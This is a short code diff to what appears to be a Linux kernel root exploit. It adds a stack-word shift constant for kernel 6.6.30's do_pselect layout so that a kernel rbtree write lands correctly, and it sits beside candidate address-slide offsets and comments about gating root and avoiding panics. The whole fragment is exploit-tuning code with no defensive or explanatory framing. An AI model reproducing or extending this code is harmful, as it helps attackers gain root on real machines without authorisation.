@@ -26,6 +26,11 @@
  * (Makefile: -DAPP_PSELECT_WINDOW_SCHED_OK=1). Verified attempt still
  * gates root; a mistimed window risks only a reboot. */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d7ca0ULL
+/* 6.6.30 AYDQ do_pselect stack layout puts the waiter one word later than
+ * 6.6.98: SHIFT=0 demonstrably misses the rbtree write (3x triggered=1 /
+ * step=4 mismatches + panics), SHIFT=1 is the only other value that fits
+ * the 15-word fdset array with the 14-word waiter. */
+#define SLIDE_PSELECT_WORD_SHIFT 1
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
   0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
